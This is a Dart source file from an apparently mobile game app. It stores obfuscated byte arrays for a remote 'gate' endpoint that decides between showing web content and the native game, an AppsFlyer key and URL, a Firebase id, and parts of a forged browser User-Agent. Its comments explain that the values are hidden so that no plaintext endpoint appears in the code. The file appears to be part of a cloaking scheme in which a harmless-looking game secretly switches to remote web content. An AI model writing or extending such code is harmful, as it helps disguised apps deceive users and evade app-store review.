import '../stealth/cipher_ring.dart';

// ============================================================
// VEILED BYTES — obfuscated endpoints & credentials
// ============================================================
// Every value below is a shrouded byte list emitted by
// `tool/code_forger.dart`. Plaintext must never appear here — a
// literal string in this file would defeat the obfuscator.
//
// On a fresh checkout the appsflyer / firebase arrays are empty on
// purpose (manager has not delivered the credentials yet). Empty
// input → reforge returns "" → the gate call short-circuits and the
// app cleanly falls back to the native game.
//
// Refresh procedure per project:
//   1. Update `_charm` / `_bandLen` in lib/stealth/cipher_ring.dart.
//   2. Update the same constants in tool/code_forger.dart.
//   3. Paste the manager-provided plaintext values into code_forger.dart.
//   4. Run:  dart run tool/code_forger.dart
//   5. Replace every array below with the printed output.
//   6. NEVER leave stale byte arrays in place — they'll decode into
//      garbage that will silently break routing.
// ============================================================

/// Config endpoint (`POST` target that decides web vs native).
/// Decodes to `https://emberdrrift.com/config.php` at runtime.
const List<int> _gateEndpoint = <int>[
  35, 180, 28, 195, 247, 55, 0, 198, 27, 111, 88, 161, 231, 206, 160, 214,
  115, 22, 94, 30, 103, 58, 42, 223, 60, 228, 48, 3, 118, 230, 102, 29, 186, 113,
];

/// AppsFlyer Get-Conversion-Data endpoint base.
const List<int> _gcdBase = <int>[
  35, 180, 28, 195, 247, 55, 0, 198, 25, 97, 94, 183, 241, 193, 252, 197,
  106, 0, 89, 86, 104, 44, 34, 130, 113, 232, 49, 8, 48, 232, 38, 30, 166, 96,
  191, 56, 3, 48, 223, 139, 149, 211, 232, 4, 128, 244, 229,
];

/// Chrome major-version fragment for the forged User-Agent.
const List<int> _chromeMajor = <int>[
  122, 244, 81, 157, 180, 35, 24, 223, 77, 52, 20, 243, 167,
];

/// WebKit major-version fragment for the forged User-Agent.
const List<int> _webkitMajor = <int>[
  126, 243, 95, 157, 183, 59,
];

/// AppsFlyer Dev Key.
const List<int> _appsflyerKey = <int>[
  27, 167, 3, 226, 182, 53, 105, 135, 9, 107, 92, 136,
  255, 248, 179, 242, 113, 38, 126, 6, 84, 96,
];

/// Firebase project number (sender id) — decodes to the value from
/// google-services.json → project_info.project_number.
const List<int> _firebaseProject = <int>[
  125, 245, 91, 133, 179, 57, 25, 218, 71, 59, 10,
];

/// Full POST endpoint. When empty, the gate short-circuits to the
/// native game — see remote_valve.dart.
String peekGateEndpoint() => reforge(_gateEndpoint);

/// Chrome major version fragment for the forged UA.
String peekChromeMajor() => reforge(_chromeMajor);

/// WebKit major version fragment for the forged UA.
String peekWebkitMajor() => reforge(_webkitMajor);

/// AppsFlyer Dev Key. Empty until packed.
String peekAppsflyerKey() => reforge(_appsflyerKey);

/// Firebase project id (numeric). Empty until packed.
String peekFirebaseProject() => reforge(_firebaseProject);

/// Builds the GCD retry URL. Returns an empty string if the base is not
/// yet encoded — callers must treat that as "GCD unavailable".
String peekGcdUrl(String appId, String deviceId) {
  final String base = reforge(_gcdBase);
  if (base.isEmpty) return '';
  return '$base$appId?devkey=${peekAppsflyerKey()}&device_id=$deviceId';
}
